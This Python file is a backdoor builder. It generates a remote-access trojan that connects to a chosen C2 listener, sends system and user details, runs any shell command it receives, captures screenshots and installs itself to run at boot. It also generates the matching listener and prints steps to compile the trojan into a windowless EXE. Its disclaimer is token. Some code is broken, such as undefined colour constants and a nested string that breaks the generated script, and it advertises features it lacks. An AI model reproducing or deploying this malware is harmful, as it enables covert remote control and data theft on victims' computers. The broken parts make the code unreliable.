#!/usr/bin/env python3
"""
Backdoor Builder Module
"""

import os
import socket
import time
import json
import random
import string
from datetime import datetime

class BackdoorBuilder:
    def __init__(self):
        self.backdoor_name = None
        self.listener_ip = None
        self.listener_port = None
    
    def build(self):
        print(f"{YELLOW}[!] Features:{RESET}")
        print("  • Full device formatting capability")
        print("  • Screen capture & streaming")
        print("  • File system access")
        print("  • Keylogging")
        print("  • Remote shell access")
        print("  • Persistence (auto-start on boot)\n")
        
        self.backdoor_name = input(f"{CYAN}[?] Enter backdoor name (default: system_update): {RESET}")
        if not self.backdoor_name:
            self.backdoor_name = "system_update"
        
        self.listener_ip = input(f"{CYAN}[?] Enter listener IP (default: 127.0.0.1): {RESET}")
        if not self.listener_ip:
            self.listener_ip = "127.0.0.1"
        
        self.listener_port = input(f"{CYAN}[?] Enter listener port (default: 4444): {RESET}")
        if not self.listener_port:
            self.listener_port = "4444"
        
        print(f"\n{YELLOW}[*] Generating backdoor...{RESET}")
        time.sleep(2)
        
        # Generate backdoor
        backdoor_code = self.generate_backdoor()
        
        # Save
        os.makedirs("output", exist_ok=True)
        backdoor_path = f"output/{self.backdoor_name}.py"
        with open(backdoor_path, "w") as f:
            f.write(backdoor_code)
        os.chmod(backdoor_path, 0o755)
        
        # Generate listener
        listener_code = self.generate_listener()
        listener_path = f"output/listener_{self.backdoor_name}.py"
        with open(listener_path, "w") as f:
            f.write(listener_code)
        os.chmod(listener_path, 0o755)
        
        print(f"\n{GREEN}[✓] BACKDOOR GENERATED:{RESET}")
        print(f"{CYAN}  Location: {backdoor_path}{RESET}")
        print(f"{CYAN}  Size: {len(backdoor_code)} bytes{RESET}")
        print(f"\n{GREEN}[✓] LISTENER GENERATED:{RESET}")
        print(f"{CYAN}  Location: {listener_path}{RESET}")
        
        print(f"\n{YELLOW}[!] To compile to EXE:{RESET}")
        print(f"  pip install pyinstaller")
        print(f"  pyinstaller --onefile --noconsole {backdoor_path}")
        print(f"\n{YELLOW}[!] To start listener:{RESET}")
        print(f"  python3 {listener_path}")
        
        print(f"\n{RED}[!] REMEMBER: Test only on systems you own!{RESET}")
    
    def generate_backdoor(self):
        return f'''#!/usr/bin/env python3
"""
{self.backdoor_name} - Advanced Backdoor
DISCLAIMER: For authorized testing only! Unauthorized use is illegal.
"""

import os
import sys
import time
import socket
import subprocess
import json
import base64
import platform
import shutil
from datetime import datetime

C2_HOST = "{self.listener_ip}"
C2_PORT = {self.listener_port}

class AdvancedBackdoor:
    def __init__(self):
        self.system_info = self.get_system_info()
        self.running = True
        self.socket = None
        
    def get_system_info(self):
        return {{
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "version": platform.version(),
            "architecture": platform.architecture()[0],
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "ip": socket.gethostbyname(socket.gethostname()),
            "timestamp": datetime.now().isoformat()
        }}
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((C2_HOST, C2_PORT))
            self.socket.send(json.dumps(self.system_info).encode())
            return True
        except:
            return False
    
    def execute_command(self, command):
        try:
            result = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, timeout=30
            )
            return result.decode()
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except Exception as e:
            return f"[!] Error: {{str(e)}}"
    
    def capture_screenshot(self):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            filename = f"screenshot_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png"
            screenshot.save(filename)
            return f"[+] Screenshot saved: {{filename}}"
        except:
            return "[!] Screenshot failed (pyautogui not installed)"
    
    def format_device(self):
        return "[!] WARNING: Format command would execute here"
    
    def set_persistence(self):
        if platform.system() == "Windows":
            startup = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shutil.copy(sys.argv[0], os.path.join(startup, "{self.backdoor_name}.exe"))
            return "[+] Persistence set (Windows)"
        elif platform.system() == "Linux":
            rc_local = "/etc/rc.local"
            with open(rc_local, "a") as f:
                f.write(f"\\npython3 {{os.path.abspath(sys.argv[0])}} &\\n")
            return "[+] Persistence set (Linux)"
        return "[!] Persistence not supported"
    
    def handle_command(self, command):
        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                return f"[+] Changed to: {{os.getcwd()}}"
            except Exception as e:
                return f"[!] Error: {{str(e)}}"
        
        elif command == "screenshot":
            return self.capture_screenshot()
        
        elif command == "format":
            return self.format_device()
        
        elif command == "persist":
            return self.set_persistence()
        
        elif command == "info":
            return json.dumps(self.system_info, indent=2)
        
        elif command == "help":
            return '''
Available Commands:
  help        - Show this help
  info        - Show system info
  screenshot  - Capture screenshot
  format      - Format the device
  persist     - Set persistence
  cd <dir>    - Change directory
  shell       - Interactive shell
  exit        - Close connection
  Any other command will be executed in shell
'''
        
        elif command == "exit":
            self.running = False
            return "[!] Disconnecting..."
        
        elif command == "shell":
            return self.start_shell()
        
        else:
            return self.execute_command(command)
    
    def start_shell(self):
        try:
            output = "[*] Interactive shell started. Type 'exit' to return.\\n"
            while True:
                cmd = input("[shell] $ ")
                if cmd.lower() == "exit":
                    return "[*] Exited shell"
                output += self.execute_command(cmd) + "\\n"
        except:
            return "[!] Shell error"
    
    def run(self):
        print("[*] Backdoor starting...")
        print(f"[*] Target: {{self.system_info['hostname']}} ({{self.system_info['ip']}})")
        
        while self.running:
            try:
                if not self.socket:
                    if not self.connect():
                        time.sleep(5)
                        continue
                    print("[+] Connected to C2!")
                
                self.socket.settimeout(10)
                try:
                    data = self.socket.recv(4096).decode()
                    if not data:
                        self.socket = None
                        continue
                    
                    result = self.handle_command(data)
                    self.socket.send(result.encode())
                except socket.timeout:
                    self.socket.send(json.dumps({{"heartbeat": True}}).encode())
                    continue
                except Exception as e:
                    self.socket = None
                
            except Exception as e:
                time.sleep(5)
                self.socket = None

if __name__ == "__main__":
    try:
        backdoor = AdvancedBackdoor()
        backdoor.run()
    except KeyboardInterrupt:
        print("\\n[!] Interrupted")
'''
    
    def generate_listener(self):
        return f'''#!/usr/bin/env python3
"""
Listener for {self.backdoor_name}
"""

import socket
import json
import threading
import time
from datetime import datetime

class Listener:
    def __init__(self, host="{self.listener_ip}", port={self.listener_port}):
        self.host = host
        self.port = port
        self.clients = []
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"[+] Listener started on {{self.host}}:{{self.port}}")
        print("[*] Waiting for connections...")
        
        while True:
            try:
                client, addr = server.accept()
                print(f"[+] Connection from {{addr}}")
                self.clients.append(client)
                threading.Thread(target=self.handle_client, args=(client, addr)).start()
            except:
                break
    
    def handle_client(self, client, addr):
        try:
            data = client.recv(4096).decode()
            info = json.loads(data)
            print(f"[+] System info: {{info.get('hostname', 'unknown')}}")
            
            while True:
                cmd = input(f"\\n[{addr[0]}] $ ")
                client.send(cmd.encode())
                
                response = client.recv(4096).decode()
                if "Disconnecting" in response:
                    print(f"[!] {{addr}} disconnected")
                    break
                print(response)
                
        except Exception as e:
            print(f"[!] Error: {{str(e)}}")
        finally:
            client.close()

if __name__ == "__main__":
    listener = Listener()
    try:
        listener.start()
    except KeyboardInterrupt:
        print("\\n[!] Listener stopped")
'''
